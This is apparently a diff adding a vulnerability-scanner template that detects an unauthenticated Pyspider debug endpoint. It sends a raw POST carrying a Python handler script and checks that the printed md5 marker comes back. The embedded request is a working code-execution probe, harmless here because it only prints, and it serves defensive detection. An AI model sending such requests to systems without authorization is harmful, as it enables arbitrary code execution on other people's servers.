@@ -1,0 +1,40 @@
+id: pyspider-unauthorized-access
+
+info:
+  name: Pyspider Unauthorized Access Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: access-control
+  description: |
+    Pyspider debug endpoint allows unauthorized access, which can be used to execute arbitrary scripts.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /debug/pyspidervulntest/run HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print('{{t2}}')&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+          - "\"logs\":"
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+    redirects: false
+    stop-at-first-match: true
+    cookie-reuse: false
+    disable-cookie: true
